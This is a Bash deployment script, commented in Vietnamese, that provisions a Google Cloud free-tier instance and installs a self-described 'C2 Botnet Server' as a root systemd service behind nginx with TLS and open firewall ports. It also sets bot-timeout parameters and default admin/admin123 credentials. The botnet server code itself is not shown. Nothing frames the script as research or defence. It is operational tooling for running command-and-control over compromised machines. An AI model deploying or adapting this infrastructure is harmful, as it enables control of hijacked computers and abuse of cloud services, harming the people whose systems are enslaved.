#!/bin/bash
# =============================================
# Script trien khai C2 Server len Google Cloud
# Su dung: Compute Engine Free Tier (e2-micro)
# =============================================

set -e

echo "========================================="
echo "  C2 BOTNET - DEPLOY GOOGLE CLOUD"
echo "  Free Tier Edition"
echo "========================================="

# ==================== CAU HINH ====================
# Thay doi cac gia tri nay
INSTANCE_NAME="c2-server"
ZONE="us-central1-a"
REGION="us-central1"
MACHINE_TYPE="e2-micro"
DISK_SIZE="30" # GB (free tier cho phep 30GB)
FIREWALL_RULE_NAME="allow-c2-server"
DOMAIN="your-domain.com" # Thay bang domain cua ban
EMAIL="admin@example.com" # Email cho Let's Encrypt

# Cau hinh server
C2_PORT="8443"
SSH_PORT="22"

echo "[INFO] Cau hinh:"
echo "  Instance: $INSTANCE_NAME"
echo "  Zone: $ZONE"
echo "  Machine: $MACHINE_TYPE (Free Tier)"
echo "  Disk: ${DISK_SIZE}GB"
echo "  Port C2: $C2_PORT"

# ==================== KIEM TRA DIEU KIEN ====================
# Kiem tra gcloud da duoc cai dat chua
if ! command -v gcloud &> /dev/null; then
    echo "[ERROR] gcloud CLI chua duoc cai dat"
    echo "  Cai dat: https://cloud.google.com/sdk/docs/install"
    exit 1
fi

# Kiem tra da xac thuc chua
if ! gcloud auth list --filter=status:ACTIVE --format="value(account)" &> /dev/null; then
    echo "[INFO] Dang nhap Google Cloud..."
    gcloud auth login
fi

# Lay project ID
PROJECT_ID=$(gcloud config get-value project 2>/dev/null)
if [ -z "$PROJECT_ID" ]; then
    echo "[ERROR] Chua dat project. Su dung: gcloud config set project YOUR_PROJECT_ID"
    exit 1
fi
echo "[INFO] Project: $PROJECT_ID"

# ==================== TAO INSTANCE ====================
echo "[STEP 1] Tao Compute Engine instance..."

# Kiem tra instance da ton tai chua
if gcloud compute instances describe "$INSTANCE_NAME" --zone="$ZONE" &>/dev/null; then
    echo "[WARN] Instance $INSTANCE_NAME da ton tai. Dang su dung instance co san..."
else
    gcloud compute instances create "$INSTANCE_NAME" \
        --zone="$ZONE" \
        --machine-type="$MACHINE_TYPE" \
        --boot-disk-size="${DISK_SIZE}GB" \
        --boot-disk-type=pd-standard \
        --image-family=ubuntu-2204-lts \
        --image-project=ubuntu-os-cloud \
        --tags=c2-server,http-server,https-server \
        --metadata=startup-script='#!/bin/bash
            apt-get update
            apt-get install -y ufw fail2ban
            ufw allow 22/tcp
            ufw allow 80/tcp
            ufw allow 443/tcp
            ufw allow 8443/tcp
            ufw --force enable
        '
    
    echo "[OK] Da tao instance: $INSTANCE_NAME"
fi

# ==================== CAU HINH FIREWALL ====================
echo "[STEP 2] Cau hinh firewall..."

# Tao firewall rule cho C2 port
if ! gcloud compute firewall-rules describe "$FIREWALL_RULE_NAME" &>/dev/null; then
    gcloud compute firewall-rules create "$FIREWALL_RULE_NAME" \
        --allow tcp:22,tcp:80,tcp:443,tcp:8443 \
        --source-ranges=0.0.0.0/0 \
        --description="Allow C2 Server ports" \
        --target-tags=c2-server
    
    echo "[OK] Da tao firewall rule: $FIREWALL_RULE_NAME"
else
    echo "[WARN] Firewall rule $FIREWALL_RULE_NAME da ton tai"
fi

# ==================== LAY IP INSTANCE ====================
echo "[STEP 3] Lay IP instance..."

EXTERNAL_IP=$(gcloud compute instances describe "$INSTANCE_NAME" \
    --zone="$ZONE" \
    --format="value(networkInterfaces[0].accessConfigs[0].natIP)")

echo "[INFO] IP: $EXTERNAL_IP"

# ==================== TAO SCRIPT CAI DAT SERVER ====================
echo "[STEP 4] Tao script cai dat server..."

cat > /tmp/install_c2_server.sh << 'INSTALL_SCRIPT'
#!/bin/bash
set -e

echo "=== C2 Server Installation ==="

# Cap nhat he thong
echo "[1/8] Cap nhat he thong..."
apt-get update
apt-get upgrade -y

# Cai dat cac goi can thiet
echo "[2/8] Cai dat dependencies..."
apt-get install -y \
    golang-go \
    git \
    nginx \
    certbot \
    python3-certbot-nginx \
    sqlite3 \
    curl \
    wget \
    build-essential

# Cai dat Go (neu phien ban cu)
echo "[3/8] Kiem tra Go version..."
if ! command -v go &> /dev/null; then
    wget https://go.dev/dl/go1.21.5.linux-amd64.tar.gz
    tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz
    echo 'export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin' >> ~/.bashrc
    export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin
    rm go1.21.5.linux-amd64.tar.gz
fi

# Tao thu muc cho C2 server
echo "[4/8] Tao thu muc C2 server..."
mkdir -p /opt/c2-server
cd /opt/c2-server

# Download source code (thay bang URL thuc te)
echo "[5/8] Tai source code..."
# git clone https://your-repo.com/c2-server.git .
# Hoac copy thu cong

# Build Go server
echo "[6/8] Build C2 server..."
go mod init c2-server 2>/dev/null || true
go mod tidy
go build -o c2-server .

# Tao systemd service
echo "[7/8] Tao systemd service..."
cat > /etc/systemd/system/c2-server.service << 'EOF'
[Unit]
Description=C2 Botnet Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/c2-server
ExecStart=/opt/c2-server/c2-server
Restart=always
RestartSec=10
Environment="C2_PORT=8443"
Environment="C2_DOMAIN=REPLACE_DOMAIN"
Environment="BOT_TIMEOUT_MINUTES=10"
Environment="CLEANUP_INTERVAL_MINUTES=5"
Environment="CMD_RETENTION_HOURS=24"
Environment="RATE_LIMIT_MAX=100"
Environment="DB_PATH=/opt/c2-server/c2_botnet.db"

[Install]
WantedBy=multi-user.target
EOF

# Khoi dong service
systemctl daemon-reload
systemctl enable c2-server
systemctl start c2-server

# Cau hinh nginx reverse proxy
echo "[8/8] Cau hinh nginx..."
cat > /etc/nginx/sites-available/c2-server << 'NGINX_EOF'
server {
    listen 80;
    server_name REPLACE_DOMAIN;
    
    # Chuyen huong HTTP sang HTTPS
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl http2;
    server_name REPLACE_DOMAIN;
    
    # SSL certificates (tu sinh hoac Let's Encrypt)
    ssl_certificate /etc/ssl/certs/c2-server.crt;
    ssl_certificate_key /etc/ssl/private/c2-server.key;
    
    # Security headers
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    
    # Rate limiting
    limit_req_zone $binary_remote_addr zone=c2_limit:10m rate=10r/s;
    limit_req zone=c2_limit burst=20 nodelay;
    
    # Reverse proxy den Go server
    location / {
        proxy_pass https://127.0.0.1:8443;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_read_timeout 86400;
        proxy_send_timeout 86400;
    }
    
    # WebSocket support
    location /ws {
        proxy_pass https://127.0.0.1:8443;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_read_timeout 86400;
    }
    
    # Gzip compression
    gzip on;
    gzip_types text/plain application/json application/javascript text/css;
    gzip_min_length 1000;
}
NGINX_EOF

# Enable site
ln -sf /etc/nginx/sites-available/c2-server /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default

# Tao SSL tu sinh (tam thoi)
mkdir -p /etc/ssl/certs /etc/ssl/private
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/ssl/private/c2-server.key \
    -out /etc/ssl/certs/c2-server.crt \
    -subj "/CN=REPLACE_DOMAIN/O=C2 Server/C=US"

# Kiem tra cau hinh nginx
nginx -t

# Khoi dong lai nginx
systemctl restart nginx

# Cau hinh logrotate
cat > /etc/logrotate.d/c2-server << 'LOGROTATE_EOF'
/opt/c2-server/*.log {
    daily
    rotate 7
    compress
    delaycompress
    missingok
    notifempty
    create 644 root root
}
LOGROTATE_EOF

echo ""
echo "========================================="
echo "  C2 Server da duoc cai dat!"
echo "  Web Panel: https://REPLACE_DOMAIN/"
echo "  Default login: admin / admin123"
echo "  Hay doi mat khau ngay sau khi dang nhap!"
echo "========================================="
INSTALL_SCRIPT

# Thay the bien trong script
sed -i "s/REPLACE_DOMAIN/$DOMAIN/g" /tmp/install_c2_server.sh

# ==================== COPY VA CHAY SCRIPT ====================
echo "[STEP 5] Copy script den instance..."

gcloud compute scp /tmp/install_c2_server.sh "$INSTANCE_NAME":/tmp/ \
    --zone="$ZONE"

echo "[STEP 6] Chay script cai dat..."

gcloud compute ssh "$INSTANCE_NAME" \
    --zone="$ZONE" \
    --command="sudo bash /tmp/install_c2_server.sh"

# ==================== CAU HINH LET'S ENCRYPT ====================
echo "[STEP 7] Cau hinh SSL voi Let's Encrypt..."

gcloud compute ssh "$INSTANCE_NAME" \
    --zone="$ZONE" \
    --command="sudo certbot --nginx -d $DOMAIN --non-interactive --agree-tos -m $EMAIL"

# ==================== HOAN TAT ====================
echo ""
echo "========================================="
echo "  TRIEN KHAI HOAN TAT!"
echo "========================================="
echo ""
echo "Thong tin server:"
echo "  IP: $EXTERNAL_IP"
echo "  Domain: $DOMAIN"
echo "  Web Panel: https://$DOMAIN/"
echo "  C2 Port: $C2_PORT"
echo ""
echo "Tai khoan mac dinh:"
echo "  Username: admin"
echo "  Password: admin123"
echo ""
echo "SSH vao server:"
echo "  gcloud compute ssh $INSTANCE_NAME --zone=$ZONE"
echo ""
echo "Kiem tra logs:"
echo "  gcloud compute ssh $INSTANCE_NAME --zone=$ZONE --command='sudo journalctl -u c2-server -f'"
echo ""
echo "========================================="